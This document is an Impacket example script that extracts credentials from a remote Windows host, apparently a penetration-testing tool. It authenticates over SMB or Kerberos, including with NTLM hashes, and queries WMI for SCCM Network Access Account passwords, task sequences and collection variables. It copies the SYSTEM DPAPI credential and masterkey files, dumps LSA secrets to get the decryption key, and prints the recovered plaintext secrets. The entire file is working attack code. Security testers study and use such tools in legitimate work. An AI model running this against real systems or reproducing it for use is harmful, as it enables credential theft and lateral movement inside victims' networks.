#!/usr/bin/env python
# Impacket - Collection of Python classes for working with network protocols.
#
# SECUREAUTH LABS. Copyright (C) 2021 SecureAuth Corporation. All rights reserved.
#
# This software is provided under a slightly modified version
# of the Apache Software License. See the accompanying LICENSE file
# for more information.
#
# Description:
#    Automates extraction of DPAPI credentials for the SYSTEM user on a remote host
#
# Authors:
#   Alberto Solino (@agsolino)
#   Clement Lavoillotte (@clavoillotte)
#   Julien Egloff (@laxaa)
#

from __future__ import division
from __future__ import print_function
import argparse
import codecs
import logging
import os
import re
import sys
import ntpath
from binascii import unhexlify, hexlify
from io import BytesIO

from impacket import version
from impacket.examples import logger
from impacket.examples.utils import parse_target

from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.dcom import wmi
from impacket.dcerpc.v5.dcomrt import DCOMConnection, COMVERSION
from impacket.dcerpc.v5.dcom.wmi import DCERPCSessionError
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_AUTHN_LEVEL_PKT_INTEGRITY

from impacket.smbconnection import SMBConnection

from impacket.dpapi import MasterKeyFile, MasterKey, CredentialFile, DPAPI_BLOB, CREDENTIAL_BLOB
from impacket.uuid import bin_to_string

from impacket.examples.regsecrets import RemoteOperations, LSASecrets

from impacket.krb5.keytab import Keytab

class DumpCreds:
    def __init__(self, remoteName, username='', password='', domain='', options=None):
        self.__remoteName = remoteName
        self.__remoteHost = options.target_ip
        self.__username = username
        self.__password = password
        self.__domain = domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__aesKey = options.aesKey
        self.__smbConnection = None
        self.__bootkey = options.bootkey
        self.__remoteOps = None
        self.__LSASecrets = None
        self.__userkey = options.userkey
        self.__doKerberos = options.k
        self.__dumpLSA = (options.userkey is None)
        self.__kdcHost = options.dc_ip
        self.__options = options
        self.key = None
        self.sccm_secrets = []
        self.raw_credentials = {}
        self.raw_masterkeys = {}
        self.masterkeys = {}
        self.required_mks = []
        self.get_sccm = options.all or options.sccm
        self.get_creds = options.all or options.creds
        self.__throttle = options.throttle

        if options.hashes is not None:
            self.__lmhash, self.__nthash = options.hashes.split(':')

    def connect(self):
        self.__smbConnection = SMBConnection(self.__remoteName, self.__remoteHost)
        if self.__doKerberos:
            self.__smbConnection.kerberosLogin(self.__username, self.__password, self.__domain, self.__lmhash,
                                               self.__nthash, self.__aesKey, self.__kdcHost)
        else:
            self.__smbConnection.login(self.__username, self.__password, self.__domain, self.__lmhash, self.__nthash)

    def getDPAPI_SYSTEM(self, secretType, secret):
        if secret.startswith("dpapi_machinekey:"):
            machineKey, userKey = secret.split('\n')
            userKey = userKey.split(':')[1]
            self.key = unhexlify(userKey[2:])

    def getFileContent(self, share, path, filename):
        content = None
        try:
            fh = BytesIO()
            filepath = ntpath.join(path,filename)
            self.__smbConnection.getFile(share, filepath, fh.write)
            content = fh.getvalue()
            fh.close()
        except:
            return None
        return content

    def decryptBlob(self, blob):
        mkid = bin_to_string(blob['GuidMasterKey'])
        key = self.masterkeys.get(mkid, None)
        if key is None:
            logging.info(f"Could not decrypt masterkey {mkid}")
            return None
        decrypted = blob.decrypt(key)
        return decrypted

    def decideBlobMasterkey(self, blob):
        mkid = bin_to_string(blob['GuidMasterKey'])
        if mkid not in self.required_mks:
            self.required_mks.append(mkid)

    def addPolicySecret(self, iEnum):
        regex = r"<PolicySecret Version=\"1\"><!\[CDATA\[(.*?)\]\]><\/PolicySecret>"

        while True:
            try:
                pEnum = iEnum.Next(0xffffffff, 1)[0]
                record = pEnum.getProperties()
                if 'NetworkAccessUsername' in record and 'NetworkAccessPassword' in record:
                    unparsed_network_access_username = record.get('NetworkAccessUsername', {}).get('value', None)
                    unparsed_network_access_password = record.get('NetworkAccessPassword', {}).get('value', None)
                    username_blob  = DPAPI_BLOB(unhexlify(re.match(regex, unparsed_network_access_username).group(1))[4:])
                    password_blob  = DPAPI_BLOB(unhexlify(re.match(regex, unparsed_network_access_password).group(1))[4:])
                    item = {'NAA_Credentials': {username_blob: password_blob}}
                    self.sccm_secrets.append(item)
                    self.decideBlobMasterkey(username_blob)
                    self.decideBlobMasterkey(password_blob)
                elif 'TS_Sequence' in record:
                    unparsed_task_sequence = record.get('TS_Sequence', {}).get('value', None)
                    task_sequence_blob = DPAPI_BLOB(unhexlify(re.match(regex, unparsed_task_sequence).group(1))[4:])
                    item = {'TS_Sequence':task_sequence_blob}
                    self.decideBlobMasterkey(task_sequence_blob)
                    self.sccm_secrets.append(item)
                elif 'Name' in record and 'Value' in record:
                    collection_name = record.get('Name', {}).get('value', None)
                    unparsed_collection_value = record.get('Value', {}).get('value', None)
                    collection_value_blob = DPAPI_BLOB(unhexlify(re.match(regex, unparsed_collection_value).group(1))[4:])
                    item = {'Collection Variable':{collection_name: collection_value_blob}}
                    self.decideBlobMasterkey(collection_value_blob)
                    self.sccm_secrets.append(item)
            except Exception as e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                if str(e).find('S_FALSE') < 0:
                    raise
                else:
                    break

    def dump(self):
        if self.get_sccm:
            # get SCCM credentials using WMI
            namespaces = [ 'root\\ccm\\Policy\\Machine\\RequestedConfig',
                           'root\\ccm\\Policy\\Machine\\ActualConfig' ]
            queries = [
                'SELECT NetworkAccessUsername, NetworkAccessPassword FROM CCM_NetworkAccessAccount',
                'SELECT TS_Sequence FROM CCM_TaskSequence',
                'SELECT Name, Value FROM CCM_CollectionVariable'
            ]

            try:
                logging.info("Querying SCCM configuration via WMI")
                for namespace in namespaces:
                    for query in queries:
                        logging.info(f'WMI namsepace {namespace} query \'{query}\'')
                        dcom = DCOMConnection(self.__remoteHost, self.__username, self.__password, self.__domain, self.__lmhash,
                                                        self.__nthash, self.__aesKey, oxidResolver=True,
                                                            doKerberos=self.__doKerberos, kdcHost=self.__kdcHost)

                        iInterface = dcom.CoCreateInstanceEx(wmi.CLSID_WbemLevel1Login, wmi.IID_IWbemLevel1Login)
                        iWbemLevel1Login = wmi.IWbemLevel1Login(iInterface)
                        try:
                            iWbemServices= iWbemLevel1Login.NTLMLogin(namespace, NULL, NULL)
                        except DCERPCSessionError as e:
                            # error code for WBEM_E_INVALID_NAMESPACE
                            # https://learn.microsoft.com/fr-fr/troubleshoot/windows-client/windows-security/mbam-client-fails-event-id-4-0x8004100e
                            if e.error_code == 0x8004100e:
                                logging.info(f'Invalid WMI namespace {namespace}')
                            iWbemLevel1Login.RemRelease()
                            dcom.disconnect()
                            break
                        if self.__options.rpc_auth_level == 'privacy':
                            iWbemServices.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
                        elif self.__options.rpc_auth_level == 'integrity':
                            iWbemServices.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_INTEGRITY)

                        iWbemLevel1Login.RemRelease()

                        iEnum = iWbemServices.ExecQuery(query)
                        self.addPolicySecret(iEnum)
                        iEnum.RemRelease()

                        iWbemServices.RemRelease()
                        dcom.disconnect()
            except Exception as e:
                logging.error(str(e))
                if type(e) is wmi.DCERPCSessionError and e.error_code == 0x8004100e:
                    logging.error("CCM namespace not found, this usually means there is no SCCM configuration on the machine.")
                try:
                    iEnum.RemRelease()
                    iWbemServices.RemRelease()
                    dcom.disconnect()
                except:
                    pass

            if len(self.sccm_secrets) == 0:
                logging.info("No SCCM secrets found")
            else:
                logging.info("Got " + str(len(self.sccm_secrets)) + " SCCM secrets.")

        # retrieve DPAPI decryption keys using SMB (and an LSA Secrets dump if needed)
        try:
            bootKey = None
            try:
                try:
                    self.connect()
                except Exception as e:
                    if os.getenv('KRB5CCNAME') is not None and self.__doKerberos is True:
                        # SMBConnection failed. That might be because there was no way to log into the
                        # target system. We just have a last resort. Hope we have tickets cached and that they
                        # will work
                        logging.debug('SMBConnection didn\'t work, hoping Kerberos will help (%s)' % str(e))
                        pass
                    else:
                        raise

                # get SYSTEM credentials (if requested) & masterkeys
                share = 'C$'
                cred_path = '\\Windows\\System32\\config\\systemprofile\\AppData\\Local\\Microsoft\\Credentials\\'
                mk_path = '\\Windows\\System32\\Microsoft\\Protect\\S-1-5-18\\User\\'

                if self.get_creds:
                    try:
                        for f in self.__smbConnection.listPath(share, ntpath.join(cred_path, '*')):
                            if f.is_directory() == 0:
                                filename = f.get_longname()
                                # "virtualapp/didlogical" creds that we skip cause not interesting
                                if 'DFBE70A7E5CC19A398EBF1B96859CE5D' in filename:
                                    continue
                                logging.info(f'Credential file found: {filename}')
                                logging.info(f'Retrieving credential file: {filename}')
                                data = self.getFileContent(share, cred_path, filename)
                                if data:
                                    self.raw_credentials[filename] = data
                                else:
                                    logging.info("Could not get content of credential file: " + filename + ", skipping")
                    except Exception as e:
                        logging.info('No credentials file found')
                    # for each credential, get corresponding masterkey file
                    useless_credentials = []
                    for k, v in self.raw_credentials.items():
                        cred = CredentialFile(v)
                        blob = DPAPI_BLOB(cred['Data'])
                        mkid = bin_to_string(blob['GuidMasterKey'])
                        if mkid not in self.raw_masterkeys:
                            logging.info("Retrieving masterkey file: " + mkid)
                            self.raw_masterkeys[mkid] = self.getFileContent(share, mk_path, mkid)
                        if self.raw_masterkeys[mkid] is None:
                            logging.info(f"Could not get content of masterkey file: {mkid} skipping")
                            useless_credentials.append(k)
                    for k in useless_credentials:
                        del self.raw_credentials[k]

                # for each SCCM secret, get corresponding masterkey file
                for mkid in self.required_mks:
                    if mkid not in self.raw_masterkeys:
                        logging.info(f"Retrieving masterkey file: {mkid}")
                        self.raw_masterkeys[mkid] = self.getFileContent(share, mk_path, mkid)
                    if self.raw_masterkeys[mkid] is None:
                        logging.info(f"Could not get content of masterkey file: {mkid}, skipping")

                # check whether there's something left to decrypt
                if len(self.raw_credentials) == 0 and len(self.sccm_secrets) == 0:
                    logging.info("Nothing to decrypt, quitting")
                    self.cleanup()
                    return

                # prepare to dump LSA secrets to get SYSTEM userkey if not provided
                if self.__userkey is None:
                    self.__remoteOps  = RemoteOperations(self.__smbConnection, self.__doKerberos, self.__kdcHost)
                    self.__remoteOps.enableRegistry()
                    if not self.__bootkey:
                        bootKey = self.__remoteOps.getBootKey()
                    else:
                        bootKey = unhexlify(self.__bootkey)
                else:
                    self.key = unhexlify(self.__userkey[2:])
            except Exception as e:
                self.__dumpLSA = False
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                logging.error('RemoteOperations failed: %s' % str(e))

            # If RemoteOperations succeeded, then we can extract LSA
            if self.__dumpLSA and self.key is None:
                try:
                    self.__LSASecrets = LSASecrets(bootKey, self.__remoteOps,
                                                 throttle=self.__throttle,
                                                 perSecretCallback = self.getDPAPI_SYSTEM)
                    self.__LSASecrets.dumpSecrets()
                    logging.info('dpapi_userkey: 0x' + hexlify(self.key).decode('utf-8'))
                except Exception as e:
                    if logging.getLogger().level == logging.DEBUG:
                        import traceback
                        traceback.print_exc()
                    logging.error('LSA hashes extraction failed: %s' % str(e))
            self.cleanup()
        except (Exception, KeyboardInterrupt) as e:
            if logging.getLogger().level == logging.DEBUG:
                import traceback
                traceback.print_exc()
            logging.error(e)
            try:
                self.cleanup()
            except:
                pass

        # decrypt collected secrets & creds
        if self.key is None:
            logging.error("Could not get SYSTEM userkey")
            return
        for k, v in self.raw_masterkeys.items():
            if v is None:
                self.masterkeys[k] = None
                continue
            data = v
            mkf = MasterKeyFile(data)
            data = data[len(mkf):]
            if not mkf['MasterKeyLen'] > 0:
                logging.error("Masterkey file " + k + " does not contain a masterkey")
                continue
            mk = MasterKey(data[:mkf['MasterKeyLen']])
            data = data[len(mk):]
            decryptedKey = mk.decrypt(self.key)
            if not decryptedKey:
                logging.error("Could not decrypt masterkey " + k)
                continue
            logging.info("Decrypted masterkey " + k + ": 0x" + hexlify(decryptedKey).decode('utf-8'))
            self.masterkeys[k] = decryptedKey
        for secret in self.sccm_secrets:
            secret_type = list(secret.keys())[0]

            if secret_type == 'NAA_Credentials':
                credentials = secret[secret_type]
                username = list(credentials.keys())[0]
                username_decrypted = self.decryptBlob(username)
                password_decrypted = self.decryptBlob(credentials[username])
                if username_decrypted:
                    username_decrypted = username_decrypted.decode('utf-16le')
                if password_decrypted:
                    password_decrypted = password_decrypted.decode('utf-16le')
                print(f'[NAA Credentials] {username_decrypted}:{password_decrypted}')

            elif secret_type == 'TS_Sequence':
                decrypted = self.decryptBlob(secret[secret_type])
                if decrypted:
                    decrypted = decrypted.decode('utf-16le').rstrip('\x0d\x0a\x00\x0a')
                    print(f'[Task_Sequence] {decrypted}')

            elif secret_type == 'Collection Variable':
                col_variable = secret[secret_type]
                name = list(col_variable.keys())[0]
                value = self.decryptBlob(col_variable[name])
                if value:
                    value = value.decode('utf-16le')
                print(f'[Colletion Variable] {name}:{value}')
        for k, v in self.raw_credentials.items():
            cred = CredentialFile(v)
            blob = DPAPI_BLOB(cred['Data'])
            mkid = bin_to_string(blob['GuidMasterKey'])
            key = self.masterkeys.get(mkid, None)
            if key is None:
                logging.info("Could not decrypt masterkey " + mkid + ", skipping credential " + k)
                continue
            logging.info("Decrypting credential " + k)
            decrypted = blob.decrypt(key)
            if decrypted is not None:
                creds = CREDENTIAL_BLOB(decrypted)
                creds.dump()
            else:
                logging.error("Could not decrypt credential file " + k)

    def cleanup(self):
        logging.info('Cleaning up... ')
        if self.__remoteOps:
            self.__remoteOps.finish()

# Process command-line arguments.
if __name__ == '__main__':
    # Explicitly changing the stdout encoding format
    if sys.stdout.encoding is None:
        # Output is redirected to a file
        sys.stdout = codecs.getwriter('utf8')(sys.stdout)

    print(version.BANNER)

    parser = argparse.ArgumentParser(add_help = True, description = "Performs remote extraction of SYSTEM DPAPI credentials and SCCM client secrets.")

    parser.add_argument('-creds', action='store_true', help='Extract SYSTEM user DPAPI credentials (default: all)')
    parser.add_argument('-sccm', action='store_true', help='Extract SCCM client credentials (default: all)')
    parser.add_argument('-userkey', action='store', help='dpapi_userkey for SYSTEM (e.g. if previously dumped using secretsdump). '
                             'If not provided an LSA secrets dump will be performed to retrieve it.')
    parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
    parser.add_argument('-ts', action='store_true', help='Adds timestamp to every logging output')
    parser.add_argument('-debug', action='store_true', help='Turn DEBUG output ON')
    parser.add_argument('-com-version', action='store', metavar = "MAJOR_VERSION:MINOR_VERSION", help='DCOM version, '
                        'format is MAJOR_VERSION:MINOR_VERSION e.g. 5.7')
    parser.add_argument('-bootkey', action='store', help='bootkey for SYSTEM hive')
    parser.add_argument('-throttle', action='store', help='Throttle in seconds between operations', default=0, type=int)
    group = parser.add_argument_group('authentication')
    group.add_argument('-hashes', action="store", metavar = "LMHASH:NTHASH", help='NTLM hashes, format is LMHASH:NTHASH')
    group.add_argument('-no-pass', action="store_true", help='don\'t ask for password (useful for -k)')
    group.add_argument('-k', action="store_true", help='Use Kerberos authentication. Grabs credentials from ccache file '
                             '(KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use'
                             ' the ones specified in the command line')
    group.add_argument('-aesKey', action="store", metavar = "hex key", help='AES key to use for Kerberos Authentication'
                                                                            ' (128 or 256 bits)')
    group.add_argument('-keytab', action="store", help='Read keys for SPN from keytab file')
    group.add_argument('-rpc-auth-level', choices=['integrity', 'privacy','default'], nargs='?', default='default',
                       help='default, integrity (RPC_C_AUTHN_LEVEL_PKT_INTEGRITY) or privacy '
                            '(RPC_C_AUTHN_LEVEL_PKT_PRIVACY). For example CIM path "root/MSCluster" would require '
                            'privacy level by default)')
    group = parser.add_argument_group('connection')
    group.add_argument('-dc-ip', action='store',metavar = "ip address",  help='IP Address of the domain controller. If '
                                 'ommited it use the domain part (FQDN) specified in the target parameter')
    group.add_argument('-target-ip', action='store', metavar="ip address",
                       help='IP Address of the target machine. If omitted it will use whatever was specified as target. '
                            'This is useful when target is the NetBIOS name and you cannot resolve it')

    if len(sys.argv)==1:
        parser.print_help()
        sys.exit(1)

    options = parser.parse_args()

    # Init the example's logger theme
    logger.init(options.ts)

    if options.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)
        # Print the Library's installation path
        logging.debug(version.getInstallationPath())
    else:
        logging.getLogger().setLevel(logging.INFO)

    domain, username, password, address = parse_target(options.target)

    if options.target_ip is None:
        options.target_ip = address

    if domain is None:
        domain = ''

    if password == '' and username != '' and options.hashes is None and options.no_pass is False and options.aesKey is None:
        from getpass import getpass
        password = getpass("Password:")

    if options.aesKey is not None:
        options.k = True

    if options.keytab is not None:
        Keytab.loadKeysFromKeytab(options.keytab, username, domain, options)
        options.k = True

    if options.hashes is not None:
        lmhash, nthash = options.hashes.split(':')
    else:
        lmhash = ''
        nthash = ''

    if options.com_version is not None:
        try:
            major_version, minor_version = options.com_version.split('.')
            COMVERSION.set_default_version(int(major_version), int(minor_version))
        except Exception:
            logging.error("Wrong COMVERSION format, use dot separated integers e.g. \"5.7\"")
            sys.exit(1)

    options.all = (options.sccm is False and options.creds is False)

    dumper = DumpCreds(address, username, password, domain, options)
    try:
        dumper.dump()
    except Exception as e:
        if logging.getLogger().level == logging.DEBUG:
            import traceback
            traceback.print_exc()
        logging.error(e)
